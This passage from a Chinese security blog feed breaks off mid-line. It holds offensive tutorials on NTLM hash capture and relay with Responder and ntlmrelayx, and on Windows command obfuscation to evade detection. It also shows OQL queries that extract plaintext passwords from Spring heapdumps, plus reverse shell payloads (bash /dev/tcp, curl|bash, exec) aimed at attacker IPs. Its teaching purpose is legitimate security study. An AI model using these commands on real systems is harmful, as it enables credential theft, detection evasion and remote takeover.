src="1627136810828-dcaf4cf2-5e61-41c5-be22-96c5b10eeac8.png" alt="img"></p><p>通过流量可以很清晰的看到，通过LLMNR欺骗了受害者，伪造101成为了 WPAD服务端。并且在用户输入凭据后，将hash 发送到了攻击端。</p><p><img src="1627136810937-28fc42c9-7af8-45f4-9625-dc339508551d.png" alt="img"></p><p><img src="1627136811050-cc53693a-0fde-4dfb-a129-04fb92cc0671.png" alt="img"></p><h2 id="HTML标签或者邮件窃取NET-NTLM-hash"><a href="#HTML标签或者邮件窃取NET-NTLM-hash" class="headerlink" title="HTML标签或者邮件窃取NET-NTLM hash"></a>HTML标签或者邮件窃取NET-NTLM hash</h2><p>虚拟机没装exchange 这里就只演示 利用 img 标签获取 NET-NTLM hash 。邮件同样是通过这种方式。</p><p><img src="1627136811132-6517fa89-6da1-40c3-9600-19e0275c75ec.png" alt="img"></p><p>通过 wireshark 可以很清晰的看到，当我们访问这个网址的时候，都发送了那些请求。</p><p>当我们没有访问带标签的网址的时候，就是正常的TCP和HTTP通信</p><p><img src="1627136811221-2b40502c-02a4-4a94-af75-e8d774433379.png" alt="img"></p><p>开启 responder ，并访问 1.html, 可以看到成功发起了 net-ntlm 请求</p><p><img src="1627136811305-0e2183c5-8e7f-40ff-bb64-7bb054d42755.png" alt="img"></p><p>并且攻击端成功获取到了 NET-NTLM hash 。</p><p><img src="1627136811390-479f9795-3401-4d4d-bc3c-e5f5d722aec6.png" alt="img"></p><p>需要注意的是，我在新版 Chrome 浏览器中，似乎并不能通过 img 标签的方式，触发 NET-NTLM 认证。但是如果直接通过 file协议的方式，还是能捕获到 net-ntlm 凭据，并且如果系统中，设置了  WPAD 自动发现的话，通过chrome 访问任意域名的时候，也能捕获到 net-ntlm hash</p><p><img src="1627136811507-5b16a829-ab4e-4fec-b974-07c11498925a.png" alt="img"></p><p><img src="1627136811583-2083f732-acc2-46da-8ffa-70a28129f778.png" alt="img"></p><h2 id="通过-NTLM-hash-Relay-执行命令"><a href="#通过-NTLM-hash-Relay-执行命令" class="headerlink" title="通过 NTLM-hash Relay 执行命令"></a>通过 NTLM-hash Relay 执行命令</h2><h3 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -r -d –v</span><br><span class="line">ntlmrelayx.py -t 192.168.1.100 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>需要修改 responder.conf 配置文件，关闭SMB与HTTP</p><p><img src="1627136811678-ea05bae1-4e02-48b2-a690-bb2dadd760d7.png" alt="img"></p><p><img src="1627136811758-93a0d548-85aa-4ec0-bab1-6b83ff8c76f8.png" alt="img"></p><h3 id="受害端"><a href="#受害端" class="headerlink" title="受害端"></a>受害端</h3><p>通过访问我们插入了img 标签的网站</p><p><img src="1627136811904-5b3cfb6d-caca-4404-9dfc-efa47f81ab50.png" alt="img"></p><p>成功截取了域控的 NET-NTLM hash</p><p><img src="1627136811990-f072d831-d37e-4bac-bb2f-e7d4d508cbe4.png" alt="img"></p><p>我们来查看一下目标受害端 192.168.1.100 的流量，可以很明显的看到攻击路径，攻击者成功盗用了 域控的 net-ntlm hash 在 192.168.1.100 上执行了命令。</p><p><img src="1627136812078-ff7c0811-a384-4c9e-84f2-d420b1ecab51.png" alt="img"></p><p>这里因为环境问题，开不了太多的虚拟机，所以我直接用的域控的 hash ,在域内机器执行的命令。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows命令混淆</title>
      <link href="/2021/08/05/Windows%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/"/>
      <url>/2021/08/05/Windows%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1-环境变量混淆"><a href="#1-环境变量混淆" class="headerlink" title="1.环境变量混淆"></a>1.环境变量混淆</h2><p>查看已设置环境变量：<code>set</code></p><p><img src="image-20210727233727445.png" alt="image-20210727233727445"></p><p>设置环境变量：<code>set test=cmd /c powershell</code></p><p>执行：<code>%test%</code></p><p><img src="image-20210727234001316.png" alt="image-20210727234001316"></p><p>该方法可以用与静态检测绕过，要对其进行日志监测还需要装sysmon。</p><h2 id="2-双引号混淆"><a href="#2-双引号混淆" class="headerlink" title="2.双引号混淆"></a>2.双引号混淆</h2><p>双引号没有什么特殊的含义，它可以帮助文件或目录保持一个整体，而不会被中间的空格所切割。</p><p>一个简单的例子就是目录名中间有空格。</p><p><img src="image-20210727234217646.png" alt="image-20210727234217646"></p><p>用法即是我们可以在敏感文件名、命令中间添加双引号。</p><p><img src="image-20210727234333078.png" alt="image-20210727234333078"></p><h2 id="3-转义符"><a href="#3-转义符" class="headerlink" title="3.转义符"></a>3.转义符</h2><p>转义符(^)也可以做为切割文件名的一个符号，但是该符号不能够连续输入。</p><p><img src="image-20210727234551946.png" alt="image-20210727234551946"></p><p>转义符也可以作为一个换行</p><p><img src="image-20210727234710284.png" alt="image-20210727234710284"></p><h2 id="4-垃圾分隔符"><a href="#4-垃圾分隔符" class="headerlink" title="4.垃圾分隔符"></a>4.垃圾分隔符</h2><p>先来了解一下管道，通过管道结合cmd我们可以执行前者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo calc | cmd</span><br></pre></td></tr></table></figure><p><img src="image-20210727234834566.png" alt="image-20210727234834566"></p><p>结合环境变量，再引入@符，可以发现仍然能够执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmd /c &quot;set x=c@alc &amp; echo %x:@=% | cmd&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@符的作用，@符能够将值传递到前面的环境变量中如：</span><br><span class="line"></span><br><span class="line">cmd /c &quot;set x=c@alc &amp; echo %x:@=test% | cmd&quot;</span><br><span class="line"></span><br><span class="line">这就可以将test传到c@alc的@位置，输出将是ctestalc。</span><br></pre></td></tr></table></figure><h2 id="5-字符串提取"><a href="#5-字符串提取" class="headerlink" title="5.字符串提取"></a>5.字符串提取</h2><p>cmd中也可以通过环境变量的方式进行变量值的字符串提取。</p><p>如：set a&#x3D;abcd，要想提取里面的某个字符串，可以通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a:~0,1%</span><br></pre></td></tr></table></figure><p>其中0表示从第几位开始提取，1表示提取几个字符串。</p><p>所以，我们可以这样去执行一个计算器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a=abcd &amp; %a:~2,1%alc</span><br></pre></td></tr></table></figure><p><img src="image-20210728000154397.png" alt="image-20210728000154397"></p><h2 id="6-圆括号"><a href="#6-圆括号" class="headerlink" title="6.圆括号"></a>6.圆括号</h2><p>成对的圆括号（）也会出现在命令参数中，也不影响命令的执行。圆括号表示嵌入子命令组，同样被cmd.exe参数处理器进行解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c &quot;(((ipconfig)))&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210728000325651.png" alt="image-20210728000325651"></p><h2 id="7-逗号与分号"><a href="#7-逗号与分号" class="headerlink" title="7.逗号与分号"></a>7.逗号与分号</h2><p>逗号与分号某些情况可以当作一个终止符号或者代替空格。</p><p><img src="image-20210728000548224.png" alt="image-20210728000548224"></p><h2 id="8-循环语句查找"><a href="#8-循环语句查找" class="headerlink" title="8.循环语句查找"></a>8.循环语句查找</h2><p>我们也可以通过for循环去查找我们所要的字符串执行，可以避免在命令行输入特殊的字符。</p><p>首先要说明for循环的几个参数及语句的意义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.for /f &quot;条件&quot; in &quot;范围&quot;</span><br><span class="line">2.tokens表示第几列</span><br><span class="line">3.delims表示切割符，可输入多个切割符</span><br></pre></td></tr></table></figure><p>例句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FOR /F “tokens=4 delims=\“ %g IN (“c:\windows\system32\powershell\”) do %g</span><br><span class="line">从”c:\windows\system32\powershell”中以反斜杠为分隔符，提取第四列的字符串并执行。当然我们可以从文件名、目录名、文件中、环境变量中去读取数据，这样我们需要的字符串就都能够提取到。</span><br></pre></td></tr></table></figure><p><img src="image-20210728000807615.png" alt="image-20210728000807615"></p><p>自动化：</p><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p><h2 id="9-与lolbins配合"><a href="#9-与lolbins配合" class="headerlink" title="9.与lolbins配合"></a>9.与lolbins配合</h2><p>有一些混淆需要配合指定的程序使用，下面是方法</p><h3 id="1-选项字符替换"><a href="#1-选项字符替换" class="headerlink" title="1.选项字符替换"></a>1.选项字符替换</h3><p>这个其实没啥说的，无非就是比如像-n，替换为&#x2F;n，看图</p><p><img src="image-20210728001243106.png" alt="image-20210728001243106"></p><h3 id="2-字符替换"><a href="#2-字符替换" class="headerlink" title="2.字符替换"></a>2.字符替换</h3><p>利用对unicode的处理问题，当使用 ˪、ˣ 和 ˢ 等字符。一些命令行解析器将它们识别为字母并将它们分别转换回 l、x 和 s。</p><p>unicode地址如下</p><p><a href="https://www.unicode.org/charts/nameslist/n_02B0.html">https://www.unicode.org/charts/nameslist/n_02B0.html</a></p><p><img src="image-20210728001327190.png" alt="image-20210728001327190"></p><h3 id="3-参数简写"><a href="#3-参数简写" class="headerlink" title="3.参数简写"></a>3.参数简写</h3><p>这个可以拿powershell为例，其-e参数与下面所有写法同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-e</span><br><span class="line">-ec</span><br><span class="line">-en</span><br><span class="line">-enc</span><br><span class="line">-enco</span><br><span class="line">-encod</span><br><span class="line">-encode</span><br><span class="line">-encoded</span><br><span class="line">-encodedc</span><br><span class="line">-encodedco</span><br><span class="line">-encodedcom</span><br><span class="line">-encodedcomm</span><br><span class="line">-encodedcomma</span><br><span class="line">-encodedcomman</span><br><span class="line">-encodedcommand</span><br></pre></td></tr></table></figure><p>各lolbin所支持的方法：</p><p><img src="image-20210728001415356.png" alt="image-20210728001415356"></p><p>自动化工具地址：<a href="https://github.com/wietze/windows-command-line-obfuscation">https://github.com/wietze/windows-command-line-obfuscation</a></p><p>参考：<a href="https://mp.weixin.qq.com/s/_iskFHuUJlQ187FWDUd31w">https://mp.weixin.qq.com/s/_iskFHuUJlQ187FWDUd31w</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网页中间件相关基础知识</title>
      <link href="/2021/08/05/%E7%BD%91%E7%AB%99%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/08/05/%E7%BD%91%E7%AB%99%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="1-IP访问和域名访问区别"><a href="#1-IP访问和域名访问区别" class="headerlink" title="1.IP访问和域名访问区别"></a>1.IP访问和域名访问区别</h3><p>IP访问：直接访问至网站根目录</p><p>域名访问：访问到中间件设置的网站目录</p><h3 id="2-常见文件后缀解析对应安全"><a href="#2-常见文件后缀解析对应安全" class="headerlink" title="2.常见文件后缀解析对应安全"></a>2.常见文件后缀解析对应安全</h3><p>例如</p><table><thead><tr><th align="center">扩展名</th><th align="center">可执行文件路径</th><th align="center">动作</th></tr></thead><tbody><tr><td align="center">.asp</td><td align="center">C:\Windows\System32\inetsrv\asp.dll  GET HEAD…</td><td align="center">GET HEAD…</td></tr></tbody></table><p>那么在访问后缀为.asp的文件路径时，网站将会解析为asp文件，即只要文件路径指向C:\Windows\System32\inetsrv\asp.dll，所对应的文件均会被解析为asp文件</p><p><img src="image-20210802231812188.png" alt="image-20210802231812188"></p><h3 id="3-常见安全访问措施"><a href="#3-常见安全访问措施" class="headerlink" title="3.常见安全访问措施"></a>3.常见安全访问措施</h3><p><img src="image-20210802231854595.png" alt="image-20210802231854595"></p><h4 id="1-身份验证和访问控制"><a href="#1-身份验证和访问控制" class="headerlink" title="1.身份验证和访问控制"></a>1.身份验证和访问控制</h4><p><img src="image-20210802231933061.png" alt="image-20210802231933061"></p><p>若不勾选匿名访问，用户在访问网站时要输入相应的服务器对应的用户名以及密码才ok</p><p><img src="image-20210802232011101.png" alt="image-20210802232011101"></p><h4 id="2-IP地址和域名限制"><a href="#2-IP地址和域名限制" class="headerlink" title="2.IP地址和域名限制"></a>2.IP地址和域名限制</h4><p><img src="image-20210802232113914.png" alt="image-20210802232113914"></p><p><img src="image-20210802232138919.png" alt="image-20210802232138919"></p><p>将其加入黑名单后访问就会受限</p><p><img src="image-20210802232221719.png" alt="image-20210802232221719"></p><h3 id="4-相应文件夹属性权限控制"><a href="#4-相应文件夹属性权限控制" class="headerlink" title="4.相应文件夹属性权限控制"></a>4.相应文件夹属性权限控制</h3><h4 id="1-服务器控制访问权限"><a href="#1-服务器控制访问权限" class="headerlink" title="1.服务器控制访问权限"></a>1.服务器控制访问权限</h4><p>从网页访问到相应的站点，属于Tnternet来宾账户，当我们在服务器上对相应文件的权限进行相关设置之后，可以限制一些黑客操作</p><p><img src="image-20210802232253709.png" alt="image-20210802232253709"></p><p>比如设置其权限全部拒绝之后，菜刀的后门就不能连接上进行有关操作了</p><p><img src="image-20210802232313832.png" alt="image-20210802232313832"></p><h4 id="2-中间件控制访问权限"><a href="#2-中间件控制访问权限" class="headerlink" title="2.中间件控制访问权限"></a>2.中间件控制访问权限</h4><p><img src="image-20210802232347194.png" alt="image-20210802232347194"></p><p>当我们设置其执行权限为无时，访问对应的小马后门会被拒绝</p><p><img src="image-20210802232417987.png" alt="image-20210802232417987"></p><p>同理，用后门工具进行连接时会直接报错</p><p>这两种防护措施都是对特定的目录进行设置的，如果设置了整个网站的权限为此，那么这个网站就不能正常运行，因为其本身运行就是相应的脚本执行，一般来说是设置..&#x2F;image目录无权限</p><p>故绕过思路是将后门放置其它目录</p><h3 id="5-中间件识别"><a href="#5-中间件识别" class="headerlink" title="5.中间件识别"></a>5.中间件识别</h3><h4 id="1-从网站数据包进行识别"><a href="#1-从网站数据包进行识别" class="headerlink" title="1.从网站数据包进行识别"></a>1.从网站数据包进行识别</h4><h5 id="1-返回数据包"><a href="#1-返回数据包" class="headerlink" title="1.返回数据包"></a>1.返回数据包</h5><p><img src="image-20210802232455509.png" alt="image-20210802232455509"></p><h5 id="2-发送数据包"><a href="#2-发送数据包" class="headerlink" title="2.发送数据包"></a>2.发送数据包</h5><p>发送数据包的session通常带有</p><h4 id="2-浏览器插件以及脚本工具"><a href="#2-浏览器插件以及脚本工具" class="headerlink" title="2.浏览器插件以及脚本工具"></a>2.浏览器插件以及脚本工具</h4><p>wappalyzer</p><p>其他脚本、工具</p><h4 id="3-url输入不存在的路径"><a href="#3-url输入不存在的路径" class="headerlink" title="3.url输入不存在的路径"></a>3.url输入不存在的路径</h4><p>有的能成功显示，有的不能</p><h3 id="6-识别脚本类型"><a href="#6-识别脚本类型" class="headerlink" title="6.识别脚本类型"></a>6.识别脚本类型</h3><h4 id="1-从数据库类型推导"><a href="#1-从数据库类型推导" class="headerlink" title="1.从数据库类型推导"></a>1.从数据库类型推导</h4><p>php ：mysql</p><p>aspx：SQL server&#x2F;mysql   </p><p>python：mysql&#x2F;mongodb&#x2F;postgresql   </p><p>asp：ascess&#x2F;sql server</p><p>jsp：mysql&#x2F;oracle</p><p>access和SQL server不支持linux</p><h4 id="2-从中间件识别"><a href="#2-从中间件识别" class="headerlink" title="2.从中间件识别"></a>2.从中间件识别</h4><p>Apache：php          iis：     tomcat：jsp</p><h4 id="3-扫描工具"><a href="#3-扫描工具" class="headerlink" title="3.扫描工具"></a>3.扫描工具</h4><h4 id="4-谷歌搜集快照信息"><a href="#4-谷歌搜集快照信息" class="headerlink" title="4.谷歌搜集快照信息"></a>4.谷歌搜集快照信息</h4><h4 id="5-分析网站数据包"><a href="#5-分析网站数据包" class="headerlink" title="5.分析网站数据包"></a>5.分析网站数据包</h4><p>例：phpsessionid、jspsessionid</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取spring heapdump中明文密码</title>
      <link href="/2020/10/26/%E8%8E%B7%E5%8F%96Spring-heapdump%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87/"/>
      <url>/2020/10/26/%E8%8E%B7%E5%8F%96Spring-heapdump%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87/</url>
      
        <content type="html"><![CDATA[<hr><p>Actuator是Spring Boot提供的应用系统监控的开源框架。在攻防场景里经常会遇到Actuator配置不当的情况，攻击者可以直接下载heapdump堆转储文件，然后通过一些工具来分析heapdump文件，从而可进一步获取敏感信息。</p><h2 id="jvisualvm"><a href="#jvisualvm" class="headerlink" title="jvisualvm"></a>jvisualvm</h2><p>jvisualvm是jdk自带可视化java监控工具，在cmd命令行直接输入jvisualvm就可以运行这款工具。</p><p>（1）通过jvisualvm加载heapdump文件</p><p><img src="1663687799374-d5deac2e-c7e0-4ab2-80e3-f97096151b20.png" alt="img"><br> （2)切换到OQL控制台标签，Springboot heapdump端点存在版本差异，构建OQL语句进行关键字查询，从而获取明文密码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Spring boot <span class="number">1.</span>x版本：select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())</span><br><span class="line">Spring boot <span class="number">2.</span>x版本：select s.value.toString() from java.util.LinkedHashMap$Entry s where /password/.test(s.key.toString())</span><br></pre></td></tr></table></figure><p><img src="1663687809485-a9dd5d09-7e03-4b7d-94d2-b94420e0f4cc.png" alt="img"></p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>jhat 是jdk自带的用于分析JVM heapdump文件的工具。</p><p>（1）使用jhat命令分析heapdump文件，启动一个端口为7000的http服务。备注：jhat 后面可配置jvm参数，避免heapdump文件占用过大内存。</p><p><img src="1663687841755-f64bb5bf-6e42-4446-8561-eeef4667a16a.png" alt="img"></p><p>（2）访问http服务，搜索关键字进入依次查看对象，获取到redis数据对象。<br> <img src="1663687873527-6841b6a1-b00e-4faa-babc-4041a4320c35.png" alt="img"></p><p>（3）点击password，从而获取到redis对象的明文密码。<br> <img src="1663687888433-19fe9c12-bfb2-424d-a8e9-8016eed90727.png" alt="img"></p><h2 id="heapdump-tool-敏感信息查询工具"><a href="#heapdump-tool-敏感信息查询工具" class="headerlink" title="heapdump_tool 敏感信息查询工具"></a>heapdump_tool 敏感信息查询工具</h2><p>本质上是基于jhat，通过通过jhat解析heapdump文件，从而实现heapdump敏感信息搜索。</p><p>https:<em>&#x2F;&#x2F;toolaffix.oss-cn-beijing.aliyuncs.com&#x2F;heapdump_tool.jar</em></p><p>利用自动化工具，快速搜索查找密码明文，AK-SK等</p><p><img src="1663687922748-7e945e9c-fdca-46ac-bd5a-ac050f6bed54.png" alt="img"></p><h2 id="Eclipse-Memory-Analyzer（MAT）"><a href="#Eclipse-Memory-Analyzer（MAT）" class="headerlink" title="Eclipse Memory Analyzer（MAT）"></a>Eclipse Memory Analyzer（MAT）</h2><p>Eclipse Memory Analyzer（简称MAT）是一个功能丰富且操作简单的JVM Heap Dump分析工具，可以用来查找 spring heapdump中的密码明文。</p><p><a href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a></p><p>（1）使用 MAT直接打开下载的 heapdump 文件，点击 OQL 标签，构建语句进行关键字查询。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Spring boot <span class="number">1.</span>x版本：select  from java.util.Hashtable$Entry x <span class="title function_">WHERE</span> <span class="params">(toString(x.key)</span>.contains(“password”))</span><br><span class="line">Spring boot <span class="number">2.</span>x版本：select  from java.util.LinkedHashMap$Entry x <span class="title function_">WHERE</span> <span class="params">(toString(x.key)</span>.contains(“password”))</span><br></pre></td></tr></table></figure><p>（2）在 java.util.LinkedHashMap$Entry 实例的键值对中，找到明文密码。</p><p><img src="1663687979676-350554f5-1dfd-4760-8cef-27bda0014169.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹及代理</title>
      <link href="/2020/10/25/%E5%8F%8D%E5%BC%B9%E5%8F%8A%E4%BB%A3%E7%90%86/"/>
      <url>/2020/10/25/%E5%8F%8D%E5%BC%B9%E5%8F%8A%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="为什么需要反弹连接"><a href="#为什么需要反弹连接" class="headerlink" title="为什么需要反弹连接"></a>为什么需要反弹连接</h2><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p><p>那么什么情况下正向连接不太好用了呢？ </p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p> 2.它的ip会动态改变，你不能持续控制。 </p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。 </p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。 </p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。 </p><h2 id="linux-反弹shell-讲解"><a href="#linux-反弹shell-讲解" class="headerlink" title="linux 反弹shell 讲解"></a>linux 反弹shell 讲解</h2><p>在谈反弹shell前，我们需要了解一下Linux的<strong>重定向符</strong>以及<strong>设备码</strong>。</p><h3 id="重定向设备码"><a href="#重定向设备码" class="headerlink" title="重定向设备码"></a>重定向设备码</h3><p>Linux的文件描述符有以下三种</p><p>标准输入：0</p><p>标准输出：1</p><p>错误输出：2</p><h3 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符"></a>重定向符</h3><h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向 &gt; &gt;&gt;"></a>输出重定向 <code>&gt;</code> <code>&gt;&gt;</code></h4><p>输出重定向是指命令的结果不再输出到显示器上，而是输出到其它地方，一般是文件中。这样做的最大好处就是把命令的结果保存起来，当我们需要的时候可以随时查询。</p><p>Bash 支持的输出重定向符号如下表所示。</p><table><thead><tr><th align="center">类 型</th><th>符 号</th><th>作 用</th></tr></thead><tbody><tr><td align="center">标准输出重定向</td><td>command &gt;file</td><td>以覆盖的方式，把 command 的正确输出结果输出到 file 文件中。</td></tr><tr><td align="center"></td><td>command &gt;&gt;file</td><td>以追加的方式，把 command 的正确输出结果输出到 file 文件中。</td></tr><tr><td align="center">标准错误输出重定向</td><td>command 2&gt;file</td><td>以覆盖的方式，把 command 的错误信息输出到 file 文件中。</td></tr><tr><td align="center"></td><td>command 2&gt;&gt;file</td><td>以追加的方式，把 command 的错误信息输出到 file 文件中。</td></tr><tr><td align="center">正确输出和错误信息同时保存</td><td>command &gt;file 2&gt;&amp;1</td><td>以覆盖的方式，把正确输出和错误信息同时保存到同一个文件（file）中。</td></tr><tr><td align="center"></td><td>command &gt;&gt;file 2&gt;&amp;1</td><td>以追加的方式，把正确输出和错误信息同时保存到同一个文件（file）中。</td></tr><tr><td align="center"></td><td>command &gt;file1 2&gt;file2</td><td>以覆盖的方式，把正确的输出结果输出到 file1 文件中，把错误信息输出到 file2 文件中。</td></tr><tr><td align="center"></td><td>command &gt;&gt;file1 2&gt;&gt;file2</td><td>以追加的方式，把正确的输出结果输出到 file1 文件中，把错误信息输出到 file2 文件中。</td></tr><tr><td align="center"></td><td>command &gt;file 2&gt;file</td><td>【<strong>不推荐</strong>】这两种写法会导致 file 被打开两次，引起资源竞争，所以 stdout 和 stderr 会互相覆盖，</td></tr><tr><td align="center"></td><td>command &gt;&gt;file 2&gt;&gt;file</td><td></td></tr></tbody></table><h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向 &lt; &lt;&lt;"></a>输入重定向 <code>&lt;</code> <code>&lt;&lt;</code></h4><p>输入重定向就是改变输入的方向，不再使用键盘作为命令输入的来源，而是使用文件作为命令的输入。</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>command &lt;file</td><td>将 file 文件中的内容作为 command 的输入。</td></tr><tr><td>command &lt;&lt;END</td><td>从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。</td></tr><tr><td>command <file1>file2</file1></td><td>将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。</td></tr></tbody></table><p>我们可以尝试一下：</p><p><img src="image-20210625120223643.png" alt="image-20210625120223643"></p><p>需要注意的是 <code>&gt;</code>、<code>&gt;&gt;</code>、<code>&lt;</code>、<code>&lt;&lt;</code> 他们都是默认为标准输入输出，也就是 <code>1&gt;</code> 或者 <code>0&lt;</code> 。而如果我们想把错误信息输出就需要使用 <code>2&gt;</code></p><p><img src="image-20210625120235731.png" alt="image-20210625120235731"></p><p>那么如果我们想把正确的命令输出到一个文件中，如果命令错误的话就输出到另外一个文件中，应该怎么做呢。</p><p><img src="image-20210625120253047.png" alt="image-20210625120253047"></p><p>可以看到结果，正确的输出到一个文件，错误的输出到另一个文件</p><p>那么如果我们想把正确和错误的数据都输出到同一个文件怎么做最简单呢。其实我们在命令末尾添加上 <code>2&gt;&amp;1</code> 就可以了</p><p><img src="image-20210625120301160.png" alt="image-20210625120301160"></p><p>那么为什么我们要去添加 <code>&amp;</code> 符呢，这是为了和文件做区分，我们知道 Linux下一切皆文件，那么如果这里没有这个 <code>&amp;</code> 符，系统就会把 1 理解成文件。而不是标准输出。所以这里的 <code>&amp;</code> 符，其实是做描述符使用的。</p><h2 id="常用的反弹-shell-方式"><a href="#常用的反弹-shell-方式" class="headerlink" title="常用的反弹 shell 方式"></a>常用的反弹 shell 方式</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>我们先看一下常见的 bash 反弹shell 的 payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bash -i &gt;&amp; /dev/tcp/192.168.1.1/4433 0&gt;&amp;1</span><br><span class="line">/sh</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>逐步分解</p><p><code>/bash -i</code> : 创建一个交互式 shell</p><p><code>/dev/tcp/ip/port</code> : &#x2F;dev&#x2F;tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。注意：&#x2F;dev&#x2F;tcp本身是不存在的</p><p><code>&gt;&amp;</code> : 将交互式的shell传给我们的远程主机</p><p><code>0&gt;&amp;1</code> : 将输出的窗口上所输入的值当作当前窗口的输入（反弹shell后会有两个窗口，即靶机的shell窗口跟攻击机的shell口。这命令的意思也可以理解为，将攻击机窗口的输入当作靶机窗口的输入最终输入给靶机。2代表标准错误输出。）</p><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.1.12/bash |bash</span><br></pre></td></tr></table></figure><p><code>|</code> 管道符，将左边命令的输出作为右边命令的输入</p><h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.5.3/6666; sh &lt;&amp;196 &gt;&amp;196 